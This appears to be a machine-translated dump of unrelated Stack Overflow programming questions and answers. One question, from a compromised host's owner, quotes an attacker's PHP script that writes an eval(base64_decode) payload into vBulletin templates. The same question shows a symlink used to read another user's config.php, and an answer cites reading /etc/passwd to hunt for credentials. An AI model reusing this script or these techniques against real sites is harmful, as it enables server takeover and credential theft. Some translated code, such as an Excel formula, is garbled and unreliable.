MySQL 不支持这种多列返回子查询，因此您看到的错误消息是因为该`VALUES`子句仅包含一个子查询，这强制（在某种意义上）只有一列。

要修复它，您可以跳过`VALUES`语法，只需编写：

```
INSERT
  INTO test (`language`,`count`)
SELECT languages.`name`, COUNT(*) AS `total`
  FROM languages
  JOIN events
    ON languages.id = events.language_id
 GROUP
    BY name
HAVING total > 250
 ORDER
    BY total DESC
; 
```

（请参阅[*MySQL 5.6 参考手册*](http://dev.mysql.com/doc/refman/5.6/en/insert-select.html)[中的第13.2.5.1 节“`INSERT ... SELECT`语法”](http://dev.mysql.com/doc/refman/5.6/en/insert-select.html)*。）*

 ** * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-12-09T13:51:06.627

> 插入测试（`语言`，`计数`）

应该

```
INSERT INTO test (language,count) 
```*

# excel - 如果行包含excel中的字符串，则添加

> ID：12866678
> 
> 赞同：1
> 
> 时间：2012-10-12T20:32:48.690
> 
> 标签：excel, excel-formula

如果不使用宏或任何花哨的东西，是否可以编写一个 Excel 公式，将对应于具有字符串“st”的 Col-2 行的 Col-1 行相加？

```
+----+-------+-------+
+ #  + Col-1 + Col-2 +
+----+ ------+-------+
+ 1  +  1    + an st +
+ 2  +  2    + f st  +
+ 3  +  1    + st fr +
+ 4  +  1    + bd bd +
+----+-------+-------+ 
```

所以在这个例子中，它应该将第 1,2 行和第 3 行相加并返回 1+2+1 = 4

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-10-12T20:36:26.063

有一种方法。用这个：`=SUMPRODUCT(ISNUMBER(FIND("st",B1:B4))*A1:A4)`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-14T09:54:52.963

为什么我们不只使用：

```
=SUMIF(B1:B4,"*st*",A1:A4) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-10-12T20:36:34.167

我会介绍第三个专栏。如果第二列包含字符串，则第三列的值将是第一列的值，否则为 0。

总结第三列中的值将返回您想要的结果。

如果您不喜欢显示或打印您介绍的列，则应将其隐藏。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-12T20:38:01.693

假设第一行在第 1 行，从 a 列开始，您可以使用以下公式在右侧添加另一列来检查每一列：

=IF（ISNUMBER（搜索（“st”，C1）），B1，0）

这应该为您的行分别返回 1、2、1、0。

将该列相加为总数。

# php - 通过 PHP 脚本进行 SQL 注入

> ID：12866680
> 
> 赞同：0
> 
> 时间：2012-10-12T20:32:58.937
> 
> 标签：php, mysql, apache, symlink

我有[PHP](http://en.wikipedia.org/wiki/PHP)安全问题。我发现有人试图获取`config.php`vBulletin[论坛](http://en.wikipedia.org/wiki/VBulletin)脚本。例如，我在用户**matt**中安装了一个 vBulletin 脚本。

所以 vbulletin 论坛的虚拟主机目录将是：

```
/home/matt/public_html/forum/includes/config.php 
```

现在黑客以另一个用户登录，我们称他为**john**，他上传了一个基于函数的 PHP 脚本`function_exist`，`base64_decode`并且`file_get_contents`. 这是代码的一部分。

完整的脚本可以在`http://www.textswell.com/read,4207852514827`.

现在我发现他可以通过符号链接获取数据库信息：

```
183697715 lrwxrwxrwx 1 john john 49 Oct  9 00:01 g.html -> /home/matt/public_html/forum/includes/config.php 
```

现在他如何对文件进行符号链接并读取数据库信息？他所做的还不止这些。他还有一个可以写入所有模板数据库的 SQL 脚本，完整代码如下：

```
 <INPUT value=\"&#1593;&#1583;&#1604;\" name=\"send\" type=\"submit\">
    </FORM>";
}
else {
    $localhost = $_POST['localhost'];
    $database  = $_POST['database'];
    $username  = $_POST['username'];
    $password  = $_POST['password'];
    $index     = $_POST['index'];
    @mysql_connect($localhost,$username,$password) or die(mysql_error());
    @mysql_select_db($database) or die(mysql_error());

    $index=str_replace("\'","'",$index);

    $set_index  = "{\${eval(base64_decode(\'";

    $set_index .= base64_encode("echo \"$index\";");

    $set_index .= "\'))}}{\${exit()}}</textarea>";

    $ok=@mysql_query("UPDATE template SET template ='".$set_index."' WHERE title ='spacer_open'") or die(mysql_error());

    if($ok){
        echo "!! update finish !!<br><br>";
    }
}
# Footer
echo "<strong>SpeciaL GreeTz To :</strong> <u>Abu-NaiF</u>";
?> 
```

我无法禁用这些功能。很多脚本都依赖它，而且我不知道如何通过 mod security 设置规则来停止脚本上编写的[MySQL查询。](http://en.wikipedia.org/wiki/MySQL)

有解决办法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T22:59:57.040

### 您的网站遭到入侵

这种攻击类似于当前的 WordPress 攻击。通常黑客会打电话`echo file_get_contents('/etc/passwd');`，然后扫描所有这些文件并搜索`database`,`localhost`和`password`其他高度敏感的词。他创建了一个`config`符号可访问的文件。然后他做破坏。

而且，据我所知，他通过`c99 script`. 您现在可以采取的一些预防措施是：

1.  为其他用户删除`execute permission`。甚至不向其他用户提供[PHP](http://en.wikipedia.org/wiki/PHP)（和 Perl）访问权限。
2.  删除缓存文件并删除未使用和连接的名称文件。
3.  请阅读*[如何防止为非 root 用户创建符号链接中的所有说明？](http://forums.cpanel.net/f185/how-prevent-creating-symbolic-links-non-root-users-202242-p2.html)*

幸运的是，看起来黑客并没有损害您的数据库（不确定）。

# couchdb - CouchDB：本地数据库复制与远程数据库复制的效率

> ID：12866683
> 
> 赞同：0
> 
> 时间：2012-10-12T20:33:27.110
> 
> 标签：couchdb

在同一 CouchDB 服务器实例上的 2 个本地数据库之间进行复制与在不同 CouchDB 实例上的 2 个数据库之间进行复制效率高多少？CouchDB 是否仍然使用某种形式的 IPC（例如套接字）来完成实例本地复制，还是采用更有效的方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-14T10:14:50.893

本地实例复制（即源和目标不使用 URL 标识的复制）完全发生在 Erlang VM 内部，因此效率更高。如果源或目标由 url 指定，则复制通过 HTTP 进行。

# c# - 查找在某些特定 asp.net 页面中使用的所有存储过程的简单方法是什么？

> ID：12866684
> 
> 赞同：2
> 
> 时间：2012-10-12T20:33:27.387
> 
> 标签：c#, asp.net, sql-server, stored-procedures

我需要找到在特定页面中使用的所有 SP。问题是，它们不是直接从页面调用，而是从其他项目中的其他程序集调用。因此，我需要分析所有代码以找到它们。我只是认为也许存在其他方法？只需在应用程序中运行此页面并捕获 SQL Server 调用的所有时刻？使用 VS 2010、MSSQL 2008、C#、Web 表单。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-18T21:23:03.617

我想到了使用 Profiler 来获取应用程序中某些特定页面上的 SP 列表，这是我从两个留下评论的人开发的。在这里，我只是分享一下我如何使用 Profiler 的详细信息：

1.  运行探查器
2.  选择 TSQ_SPs 模板
3.  在事件选择选项卡上选择“显示所有列”复选框
4.  在同一页面上只检查一个事件：SP:Completed
5.  在列过滤器上为 ApplicationName、DatabaseName、HostName、LoginName 设置过滤器。实际上，仅 DatabaseName 和 HostName 就足够了。HostName 作为我的计算机名，因为我从 VS 本地运行应用程序。
6.  将跟踪属性另存为模板。
7.  运行跟踪
8.  运行应用程序。
9.  在加载所需的页面清洁跟踪之前
10.  打开页面并按下页面上的不同按钮和控件
11.  完成页面上的所有操作后，将 Trace 作为 Trace Table 保存到 db。
12.  运行以下查询：

    从 SPTableName 中选择不同的对象名

并获取此页面的 SP 列表。DISTINCT 允许您消除重复的 SP，因为在每个页面上 SP 运行多次。

对每一页重复 9 - 12。

# linq - 使用 C# Linq 的动态 PIVOT

> ID：12866685
> 
> 赞同：0
> 
> 时间：2012-10-12T20:33:31.460
> 
> 标签：linq, c#-4.0

我正在尝试使用以下代码来创建 PIVOT，但它不起作用。

它给了我编译时错误。我不知道 linq 所以无法使用它。

请帮忙 ：

```
 DataTable Pivot(DataTable dt, DataColumn pivotColumn, DataColumn pivotValue) {
    // find primary key columns 
    //(i.e. everything but pivot column and pivot value)
    DataTable temp = dt.Copy();
    temp.Columns.Remove( pivotColumn.ColumnName );
    temp.Columns.Remove( pivotValue.ColumnName );
    string[] pkColumnNames = temp.Columns.Cast(<DataColumn>)
        .Select( c => c.ColumnName )
        .ToArray();

    // prep results table
    DataTable result = temp.DefaultView.ToTable(true, pkColumnNames).Copy();
    result.PrimaryKey = result.Columns.Cast(<DataColumn>).ToArray();
    dt.AsEnumerable()
        .Select(r =>; r[pivotColumn.ColumnName].ToString())
        .Distinct().ToList()
        .ForEach (c => result.Columns.Add(c, pivotColumn.DataType));

    // load it
    foreach( DataRow row in dt.Rows ) {
        // find row to update
        DataRow aggRow = result.Rows.Find(
            pkColumnNames
                .Select( c => row[c] )
                .ToArray() );
        // the aggregate used here is LATEST 
        // adjust the next line if you want (SUM, MAX, etc...)
        aggRow[row[pivotColumn.ColumnName].ToString()] = row[pivotValue.ColumnName];
    }

    return result;
} 
```

代码来自： http: [//michaeljswart.com/2011/06/forget-about-pivot/](http://michaeljswart.com/2011/06/forget-about-pivot/)

此外，它尝试使用以下代码，它运行良好，除了它没有给出值列的总和

```
public DataTable GetInversedDataTable(DataTable table, string columnX, string columnY, string columnZ, string nullValue, bool sumValues)
        {
            //Create a DataTable to Return
            DataTable returnTable = new DataTable();

            DataTable tempTable = table.Clone();

            if (string.IsNullOrEmpty(columnX))
            {
                columnX = table.Columns[0].ColumnName;
            }

            tempTable.Columns.Remove(columnX);

            //Add a Column at the beginning of the table
            //returnTable.Columns.Add(columnY);

            returnTable = tempTable.Clone();

            //Read all DISTINCT values from columnX Column in the provided DataTale
            List<string> columnXValues = new List<string>();

            foreach (DataRow dr in table.Rows)
            {
                string columnXTemp = dr[columnX].ToString();
                if (!columnXValues.Contains(columnXTemp))
                {
                    //Read each row value, if it's different from others provided, add to the list of values and creates a new Column with its value.
                    columnXValues.Add(columnXTemp);
                    returnTable.Columns.Add(columnXTemp);
                }
            }

            //Verify if Y and Z Axis columns re provided
            if (!string.IsNullOrEmpty(columnY) && !string.IsNullOrEmpty(columnZ))
            {
                //Read DISTINCT Values for Y Axis Column
                List<string> columnYValues = new List<string>();

                foreach (DataRow dr in table.Rows)
                {
                    if (!columnYValues.Contains(dr[columnY].ToString()))
                    {
                        columnYValues.Add(dr[columnY].ToString());
                    }
                }

                //Loop all Column Y Distinct Value
                foreach (string columnYValue in columnYValues)
                {
                    //Creates a new Row
                    DataRow drReturn = returnTable.NewRow();
                    drReturn[0] = columnYValue;
                    //foreach column Y value, The rows are selected distincted
                    DataRow[] rows = table.Select((columnY + "='") + columnYValue + "'");

                    //Read each row to fill the DataTable
                    foreach (DataRow dr in rows)
                    {
                        string rowColumnTitle = dr[columnX].ToString();

                        //Read each column to fill the DataTable
                        foreach (DataColumn dc in returnTable.Columns)
                        {
                            if (dc.ColumnName == rowColumnTitle)
                            {
                                //If Sum of Values is True it try to perform a Sum
                                //If sum is not possible due to value types, the value displayed is the last one read
                                if (sumValues)
                                {
                                    try
                                    {
                                        drReturn[rowColumnTitle] = Convert.ToDecimal(drReturn[rowColumnTitle]) + Convert.ToDecimal(dr[columnZ]);
                                    }
                                    catch
                                    {
                                        drReturn[rowColumnTitle] = dr[columnZ];
                                    }
                                }
                                else
                                {
                                    drReturn[rowColumnTitle] = dr[columnZ];

                                }
                            }
                        }
                    }

                    returnTable.Rows.Add(drReturn);

                }
            }
            else
            {
                throw new Exception("The columns to perform inversion are not provided");
            }

            //if a nullValue is provided, fill the datable with it
            if (!string.IsNullOrEmpty(nullValue))
            {
                foreach (DataRow dr in returnTable.Rows)
                {
                    foreach (DataColumn dc in returnTable.Columns)
                    {
                        if (string.IsNullOrEmpty(dr[dc.ColumnName].ToString()))
                        {
                            dr[dc.ColumnName] = nullValue;
                        }
                    }
                }
            }

            return returnTable;
        }

GetInversedDataTable(dtNormal, "Dated", "OrderStatus", "Qty", " ", true); 
```

请帮忙 ：）

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-13T03:37:51.730

以下是更正编译错误的代码：

```
DataTable Pivot(DataTable dt, DataColumn pivotColumn, DataColumn pivotValue) {
    // find primary key columns 
    //(i.e. everything but pivot column and pivot value)
    DataTable temp = dt.Copy();
    temp.Columns.Remove( pivotColumn.ColumnName );
    temp.Columns.Remove( pivotValue.ColumnName );
    string[] pkColumnNames = temp.Columns.Cast<DataColumn>()
        .Select( c => c.ColumnName )
        .ToArray();

    // prep results table
    DataTable result = temp.DefaultView.ToTable(true, pkColumnNames).Copy();
    result.PrimaryKey = result.Columns.Cast<DataColumn>().ToArray();
    dt.AsEnumerable()
        .Select(r => r[pivotColumn.ColumnName].ToString())
        .Distinct().ToList()
        .ForEach (c => result.Columns.Add(c, pivotColumn.DataType));

    // load it
    foreach( DataRow row in dt.Rows ) {
        // find row to update
        DataRow aggRow = result.Rows.Find(
            pkColumnNames
                .Select( c => row[c] )
                .ToArray() );
        // the aggregate used here is LATEST 
        // adjust the next line if you want (SUM, MAX, etc...)
        aggRow[row[pivotColumn.ColumnName].ToString()] = row[pivotValue.ColumnName];
    }

    return result;
} 
```

我改为`Cast(<DataColumn>)`在`Cast<DataColumn>()`两个位置，并去掉了 lambda 表达式中间的分号。你问题的第二部分有点棘手。你可能想把它当作自己的问题来问。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-01-15T09:13:36.470

好一个。，但你可能想替换下面的行

```
 .ForEach (c => result.Columns.Add(c, pivotColumn.DataType)); 
```

有了这个（将pivotColumn更改为pivotValue）

```
 .ForEach (c => result.Columns.Add(c, pivotValue.DataType)); 
```

非常适合我的要求。

# mongodb - 如何使用 mongoid 声明一个未存储在 DB 中的变量？

> ID：12866688
> 
> 赞同：0
> 
> 时间：2012-10-12T20:33:51.373
> 
> 标签：mongodb, mongoid

是否有某种瞬态我可以使用非字段，并且仍然在对象中维护而不存储在数据库中：

例如：

```
class User
   dont-store :birthday
end 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-12T20:36:24.440

只需使用普通的 old `attr_accessor`。

```
class Customer
  field :name # this is stored
  attr_accessor :credit_card # does not get stored
end 
```

# ios - iOS 4.3 错误-GADObjectPrivate 上的 Admob 广告

> ID：12866693
> 
> 赞同：0
> 
> 时间：2012-10-12T20:34:30.817
> 
> 标签：ios, admob

我在新应用程序上收到以下错误：

> 'NSInvalidArgumentException'，原因：'-[GADObjectPrivate changeState:]：无法识别的选择器发送到实例 0x1ed49a90'。

我有几个广告网络——Chartboost 和 Admob。这似乎是一个 Admob 错误，但它会导致应用程序在启动时终止。我已经删除了 admob 代码和文件，但我仍然收到错误消息。

我不知道这是否对任何人有帮助：

> *** First throw call stack: (0x374ca2a3 0x34fca97f 0x374cde07 0x374cc531 0x37423f68 0x9e950 0xa0314 0x9deb0 0x6e147 0x36e53595 0x36e93d79 0x36e8faed 0x36ed11d1 0x6de0d 0x36e94ad9 0x36e94663 0x36e8c84b 0x36e34c41 0x36e346d5 0x36e34123 0x350c75a3 0x3749f683 0x3749eee9 0x3749dcb7 0x37410ebd 0x37410d49 0x36e8b485 0x36e88301 0x6db2d 0x6da90) libc++abi.dylib: terminate called throwing an exception

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-13T00:17:32.223

您使用的是哪个版本的 AdMob？如果您使用的是 v6.2，则必须使用 Build Settings 的“Other Linker Flags”部分中的 -ObjC 链接器标志。如果您使用的是 v6.1 或更低版本，则必须使用 -all_load 链接器标志。

此外，如果您使用的是 v6.2，则必须使用 XCode 4.5 并以 iOS 6 为目标（不过，您可以将最低部署目标设置为 iOS 4.3）。

# java - HtmlUnit 无法获取 IFRAME 添加的 js/ajax

> ID：12866694
> 
> 赞同：4
> 
> 时间：2012-10-12T20:34:35.547
> 
> 标签：java, javascript, ajax, iframe, htmlunit

我刚刚开始通过 gargoylesoftware 学习[htmlunit](http://htmlunit.sourceforge.net/)，但遇到了问题。页面上有一个 iframe，在单击按钮后出现。当我尝试按名称获取此 iframe 时，我得到一个`ElementNotFoundException`. 我也尝试过`page.getFrames()`，它返回帧，但没有我正在寻找的帧或者它是空白的。所以看起来 js/ajax 没有更新它。我在 jcpenny(dot)com 上工作，当我尝试从“我的包”页面“结帐”时出现问题 这是我的 WebClient 设置

```
BrowserVersion bv = BrowserVersion.CHROME_16;
bv.setUserAgent("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)");
CookieManager cm = new CookieManager();
cm.clearCookies();
cm.setCookiesEnabled(true);
WebClient webClient = new WebClient(bv);
webClient.setCookieManager(cm);
webClient.setAjaxController(new NicelyResynchronizingAjaxController());
webClient.setJavaScriptTimeout(15000);
webClient.setCssErrorHandler(new SilentCssErrorHandler());
webClient.getOptions().setJavaScriptEnabled(true);
webClient.getOptions().setThrowExceptionOnScriptError(false);
webClient.waitForBackgroundJavaScript(15000);
webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);
webClient.getOptions().setRedirectEnabled(true);
webClient.getOptions().setUseInsecureSSL(true);
webClient.setRefreshHandler(new ThreadedRefreshHandler()); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2014-07-14T11:26:40.270

这可能是迟到的答案，但将来对其他人有用。

```
HtmlPage currentPage = (HtmlPage)webClient.getWebWindowByName("Frame Name").getEnclosedPage(); 
```

希望这将有助于识别 iframe。

# fonts - 记事本++中的MacType

> ID：12866699
> 
> 赞同：0
> 
> 时间：2012-10-12T20:35:06.890
> 
> 标签：fonts, notepad++, antialiasing

我敢肯定，你们中的许多人都使用 MacType 在 Windows 上对较小的字体进行抗锯齿处理。不幸的是，Notepad++ 包含它自己的字体渲染（或者我认为）。关于如何让 MacType 在 Notepad++ 中工作的任何提示？

# git - 使用名称中的破折号删除 git 上的远程分支

> ID：12866700
> 
> 赞同：3
> 
> 时间：2012-10-12T20:35:09.490
> 
> 标签：git

我无法删除名称中包含破折号的远程分支。

```
git push origin :paul-ms
error: unable to push to unqualified destination: paul-ms
The destination refspec neither matches an existing ref on the remote nor
begins with refs/, and we are unable to guess a prefix based on the source ref.
error: failed to push some refs to 'git@github.com:blah/blah.git'

git push origin --delete 'paul-ms'
error: unable to push to unqualified destination: paul-ms
The destination refspec neither matches an existing ref on the remote nor
begins with refs/, and we are unable to guess a prefix based on the source ref.
error: failed to push some refs to 'git@github.com:blah/blah.git' 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-10-12T20:44:10.497

采用：`git push origin :refs/heads/paul-ms`

请参阅：[Git - Refspec](http://git-scm.com/book/en/Git-Internals-The-Refspec)

# c++ - 如何在 C++ 中将枚举与用户输入一起使用

> ID：12866701
> 
> 赞同：4
> 
> 时间：2012-10-12T20:35:10.280
> 
> 标签：c++, enums

我正在制作一个简单的石头剪刀布游戏，我需要使用枚举数据结构。我的问题是我无法编译以下代码，因为从 int (userInput) 到 Throws (userThrow) 的转换无效。

```
enum Throws {R, P, S};
int userInput;
cout << "What is your throw : ";
cin >> userInput;
Throws userThrow = userInput; 
```

帮助？！

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2016-03-07T12:07:40.390

你可以这样做：

```
int userInput;
std::cin >> userInput;
Throws userThrow = static_cast<Throws>(userInput); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T20:38:57.323

R、P 和 S 在技术上现在是数字的标识符（分别为 0,1 和 2）。您的程序现在不知道 0、1 和 2 曾经映射到字母或字符串。

相反，您必须获取输入并手动将其与“R”、“P”和“S”进行比较，如果匹配，则`userThrow`相应地设置变量。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T20:40:10.187

C++ 中的枚举只是整数常量。它们在编译时被解析并变成数字。

您必须通过查找正确的枚举项来覆盖`>>`运算符以提供正确的转换。我发现[这个](http://www.daniweb.com/software-development/cpp/threads/22861/c-help-with-enum-and-cin)链接很有用。

基本上你从标准输入读取一个 int 并使用它来构建一个`Throws`项目`Throws(val)`。

相反，如果您想通过将字符串作为输入来直接输入枚举字段的表示，那么它本身并不存在，您必须手动完成，因为如开头所述，枚举名称在编译时会消失时间。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-10-12T20:58:22.027

试试这个：

```
enum Throws {R = 'R', P = 'P', S = 'S'};
char userInput;
cout << "What is your throw : ";
cin >> userInput;
Throws userThrow = (Throws)userInput; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-10-12T21:11:28.307

由于编译器将枚举视为整数，因此您必须手动设置每个枚举的整数以对应 ASCII 代码，然后将整数输入转换为您的枚举。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2017-10-29T11:35:18.760

你可以试试这个：

```
int userOption;
std::cin >> userOption; 
```

如果您不想分配用户输入数据，只想检查然后使用下面的代码

```
Throws userThrow = static_cast<Throws>(userOption); 
```

如果要在枚举中分配用户输入，请使用以下代码

```
Throws R = static_cast<Throws>(userOption); 
```

在这里您根据需要选择R或P或S。

# r - 使用索引保留不正确的名称

> ID：12866704
> 
> 赞同：4
> 
> 时间：2012-10-12T20:35:37.057
> 
> 标签：r

我需要用重复的名称命名 data.frame 的列。里面的`data.frame`你可以`check.names = FALSE`用来做顽皮的名字契约。但是，如果您将其编入索引，那么您在编入索引时就会失去顽皮的名字。我想保留这些名字。所以 beloe 是一个例子，我得到的输出是我想得到的：

```
x <- data.frame(b= 4:6, a =6:8, a =6:8, check.names = FALSE)
x[, -1] 
```

我得到：

```
 a a.1
1 6   6
2 7   7
3 8   8 
```

我想要：

```
 a a
1 6 6
2 7 7
3 8 8 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-10-12T20:49:30.377

这个怎么样：

```
subdf <- function(df, ii) {
    do.call("data.frame", c(as.list(df)[ii], check.names=FALSE))
}

subdf(x, -1)
#   a a
# 1 6 6
# 2 7 7
# 3 8 8

subdf(x, 2:3)
#   a a
# 1 6 6
# 2 7 7
# 3 8 8 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-10-12T20:48:32.370

这是一个丑陋的解决方案

```
> tmp <- data.frame(b=4:6, a=6:8, a=6:8, check.names=FALSE)
> setNames(tmp[, -1], names(tmp)[-1])
  a a
1 6 6
2 7 7
3 8 8 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-10-12T20:49:29.673

查看代码`[.data.frame`作为代码的一部分

```
if (anyDuplicated(cols)) 
    names(y) <- make.unique(cols) 
```

而且我在代码中看不到任何允许跳过该检查的内容。所以看起来我们只需要编写自己的函数。虽然它不是很安全，但我相信可以创建一个更好的版本......

```
dropCols <- function(x, cols){
  nm <- colnames(x)
  x <- x[, -cols]
  colnames(x) <- nm[-cols]
  x
}

x <- data.frame(b= 4:6, a =6:8, a =6:8, check.names = FALSE)
#x[, -1]
dropCols(x, 1)
#  a a
#1 6 6
#2 7 7
#3 8 8 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-10-12T20:49:43.807

根据 dirks 的舌头评论：

```
safe.data.frame <- function(dat, index) {
    colnam <-colnames(dat)[index]
    dat2 <- dat[, index]
    colnames(dat2) <- colnam
    dat2
}
safe.data.frame(x, -1) 
```

我希望有更好的东西:)

# javascript - Google Chrome - 未捕获的类型错误：无法调用 null 的方法“getElementsByClassName”

> ID：12866705
> 
> 赞同：2
> 
> 时间：2012-10-12T20:35:47.897
> 
> 标签：javascript, google-chrome, userscripts

我一直在尝试为 Google Chrome 编写我的第一个用户脚本。它检查路由器页面并重新连接，直到获得有效的 IP 地址。

我将脚本保存为 IPchecker.user.js 并通过扩展页面将其安装在 google chrome 中。但是当我刷新页面时，javascript控制台会抛出一个错误：

```
Uncaught TypeError: Cannot call method 'getElementsByClassName' of null 
```

据我了解，这意味着它不知道文件是什么。但这怎么会发生呢？我认为脚本将在文档准备好后运行？这不是真的吗？这是在 javascript 控制台中工作的代码。

```
// ==UserScript==  
// @name         WAN checker
// @version      0.0.1
// @description  Check tomato IP addresses and reconnect as needed
// @match        *://192.168.1.1/status-overview.asp
// ==/UserScript== 

(function reconnect() {
    wan1ip = document.getElementById('wan1ip').getElementsByClassName('content')[0].innerText.split('.').slice(0,2).join('.');

    if (wan1ip != "333.3333") {
    wan_connect("1");
    setTimeout("reconnect()",2000);
    }
    wan2ip = document.getElementById('wan2ip').getElementsByClassName('content')[0].innerText.split('.').slice(0,2).join('.');
if (wan2ip != "333.333") {
    wan_connect("2");
    setTimeout("reconnect()",2000);
    }
})(); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-12T20:38:31.693

你不是在调用它`document`。你正在调用它

```
 document.getElementById('wan1ip') 
```

确保元素存在。

对于测试，您可以将其分解并执行

```
container = document.getElementById('wan1ip');
console.log(container, container.getElementsByClassName('content')); 
```

这将向您显示您正在`getElementsByClassName`使用的元素以及它在其中找到的该类的任何元素。我敢打赌第一个将是空的。

这也可以，但可能不会得到你想要的结果：

```
document.getElementsByClassName('content') 
```

# c# - 即使启用了假脱机文件池，如何找到具有给定 ID 的作业的假脱机文件？

> ID：12866711
> 
> 赞同：17
> 
> 时间：2012-10-12T20:36:04.227
> 
> 标签：c#, windows, print-spooler-api

我想将给定 Windows 打印作业的假脱机数据复制到磁盘上的任意位置。

我有来自[Print Spooler API](http://msdn.microsoft.com/en-us/library/windows/desktop/dd162863%28v=vs.85%29.aspx)的打印作业的作业 ID 。我知道这项工作已经完成了假脱机。我知道在我有时间完成我需要做的任何事情之前，该工作不会被删除。

如果禁用了文件池，我可以通过在假脱机目录中查找格式为“xxxxx.spl”的文件来执行此操作，其中 xxxxx 是填充为 0 的作业 ID。

如果启用了文件池，我该怎么做？

如果有一种方法可以获取作业 ID 并返回假脱机数据流，我会很高兴，但目前这似乎不太可能。`OpenPrinter`据推测，使用“PrinterName,Job xxxx”和 ReadPrinter可能会出现类似的情况，如此[处](http://msdn.microsoft.com/en-us/library/windows/desktop/dd162863%28v=vs.85%29.aspx)所述，但到目前为止我[还无法让它工作](https://stackoverflow.com/questions/12866444/why-do-i-get-error-access-denied-attempting-to-open-a-specific-job-using-openpri)，即使我这样做了，它看起来也会将数据加载到内存中，而且我不确定这将如何处理大型假脱机文件（> 1 GB 并不罕见）。

我的第二个偏好是传递 ID 并使用磁盘上的假脱机数据取回文件位置的方法（无论文件池设置如何）。

我的第三个偏好是将池文件（“FPyyyyy.spl”）映射到它的作业 ID 的方法。

这些是否可行，或者是否有人对如何解决这个问题有更好的想法？

（编辑添加，因为不清楚我们是否知道此选项）：我们的后备方案是要求我们的客户通过编辑每台打印机的注册表来禁用假脱机文件池，但我们更希望避免这种情况。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-14T00:47:37.783

我[弄清楚了](https://stackoverflow.com/questions/12866444/why-do-i-get-error-access-denied-attempting-to-open-a-specific-job-using-openpri)为什么我的调用失败并且我已经使用and`OpenPrinter`成功读取了假脱机数据，这很好地解决了我们的问题。`OpenPrinter``ReadPrinter`

不过，我仍然会将赏金奖励给提出更好解决方案的任何人。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-13T21:46:19.020

你读过这个吗？

[http://www.undocprint.org/winspool/spool_files](http://www.undocprint.org/winspool/spool_files)

它似乎拥有你需要的一切:)

具体来说`To Turn Off Spool File Pooling on a Per Printer Queue-Basis`

还有这篇关于假脱机文件格式的文章[http://www.codeproject.com/Articles/9720/The-Windows-NT-print-spool-shadow-file-format](http://www.codeproject.com/Articles/9720/The-Windows-NT-print-spool-shadow-file-format)但是似乎您已经知道格式它可能不会有任何帮助。

# ios - 如何在 ARC 下的 countByEnumeratingWithState 中安全地存储额外的对象？

> ID：12866713
> 
> 赞同：3
> 
> 时间：2012-10-12T20:36:12.497
> 
> 标签：ios, automatic-ref-counting, fast-enumeration

如何安全地将几个对象实例存储在`NSFastEnumerationState`的额外数组中？

我希望在循环运行时保留这些项目，然后在循环完成时释放。

```
- (NSUInteger)countByEnumeratingWithState: (NSFastEnumerationState *)state
                                  objects: (__unsafe_unretained id *)stackbuf
                                    count: (NSUInteger)len {
    unsigned long days = 0;
    id current = nil;
    id components = nil;
    if (state->state == 0)
    {
        current = [NSCalendar currentCalendar];
        state->mutationsPtr = &state->extra[0];
        components = [current components: NSDayCalendarUnit fromDate: _startDate toDate: _endDate options: 0];
        days = [components day];
        state->extra[0] = days;
        state->extra[1] = (uintptr_t)(__bridge void *)current;
        state->extra[2] = (uintptr_t)(__bridge void *)components;
    } else {
        days = state->extra[0];
        current = (__bridge NSCalendar *)(void *)(state->extra[1]);
        components = (__bridge NSDateComponents *)(void *)(state->extra[2]);
    }
    NSUInteger count = 0;
    if (state->state <= days) {
        state->itemsPtr = stackbuf;
        while ( (state->state <= days) && (count < len) ) {
            [components setDay: state->state];
            stackbuf[count] = [current dateByAddingComponents: components toDate: _startDate options: 0];
            state->state++;
            count++;
        }
    }
    return count;
} 
```

这是`NSFastEnumerationState`来自 Apple 标头的 的定义：

```
typedef struct {
    unsigned long state;
    id __unsafe_unretained *itemsPtr;
    unsigned long *mutationsPtr;
    unsigned long extra[5];
} NSFastEnumerationState; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-13T12:43:34.383

史蒂文，

为什么要尝试使用 C 语言结构来保存这些项目，而不是在要为其构建枚举器的类中将它们设为私有 ivars？让它们成为 ivars，问题就不存在了。

安德鲁

# java - 确保 JRE 在您的系统路径中

> ID：12866714
> 
> 赞同：0
> 
> 时间：2012-10-12T20:36:22.130
> 
> 标签：java

如何确保 JRE 在我的系统路径中？好吧，实际上，我知道这不是因为从命令行运行 java -jar 会产生 java is not recognize 错误。

如何将 JRE 放入我的系统路径？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-12T20:43:59.910

您可以编辑您的`PATH`变量，例如。在 Windows 中（在控制面板\所有控制面板项\系统\高级系统设置\环境变量下

```
PATH=%PATH%;C:\Java6\jre\bin 
```

# sml - 在 SML 中添加两个元组

> ID：12866721
> 
> 赞同：2
> 
> 时间：2012-10-12T20:36:55.740
> 
